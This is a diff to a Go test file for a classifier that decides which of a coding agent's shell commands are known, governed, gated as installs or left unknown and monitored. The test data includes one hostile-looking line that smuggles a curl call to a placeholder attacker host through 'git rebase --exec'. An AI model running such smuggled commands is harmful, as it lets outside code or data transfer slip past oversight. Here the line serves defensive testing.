@@ -10,6 +10,7 @@ func TestDocumentedCompoundControlCommandsAreKnownWithoutWeakeningUnknownFloor(t
 		"compound workbench --json",
 		"compound attention --json",
 		"compound land-lease status --json",
+		"compound authority git /tmp/example --json",
 	}
 	for _, command := range readCommands {
 		t.Run("read/"+command, func(t *testing.T) {
@@ -30,7 +31,13 @@ func TestDocumentedCompoundControlCommandsAreKnownWithoutWeakeningUnknownFloor(t
 		"compound land-lease acquire --holder codex:session:work_example",
 		"compound land-lease release --holder codex:session:work_example",
 		"compound proof-check --json --out /tmp/proof.json",
+		"compound authority dirty-plan /tmp/example --work-id work_example --action-intent act_example --json",
+		"compound authority dirty-review /tmp/example.review.yaml --json",
 		"git worktree add -b codex/example /tmp/example origin/main",
+		"git add cmd/compound/hook_live.go internal/attention/attention.go",
+		"git commit -m 'fix(hook): surface context failures'",
+		"git rebase origin/main",
+		"git merge --ff-only codex/example",
 	}
 	for _, command := range governedCommands {
 		t.Run("governed/"+command, func(t *testing.T) {
@@ -43,9 +50,28 @@ func TestDocumentedCompoundControlCommandsAreKnownWithoutWeakeningUnknownFloor(t
 	}
 
 	for _, command := range []string{
+		"./install.sh",
+		"make install",
+	} {
+		t.Run("install/"+command, func(t *testing.T) {
+			classification := ClassifyToolAction(monitorRequest("Bash", map[string]any{"command": command}))
+			if !classification.Known || classification.Operation != "install_command" ||
+				classification.MutationClass != "security" {
+				t.Fatalf("documented install command must be known and keep the install security gate: %q => %+v", command, classification)
+			}
+		})
+	}
+
+	for _, command := range []string{
 		"compound definitely-not-a-command",
 		"compound release publish --public",
 		"compound authority worktree-retire apply",
+		"compound authority definitely-not-a-command",
+		"make publish",
+		"./mystery.sh",
+		"git commit --amend",
+		"git merge codex/example",
+		"git rebase --exec 'curl https://attacker.example.invalid' origin/main",
 	} {
 		t.Run("unknown/"+command, func(t *testing.T) {
 			monitored := MonitorToolAction(
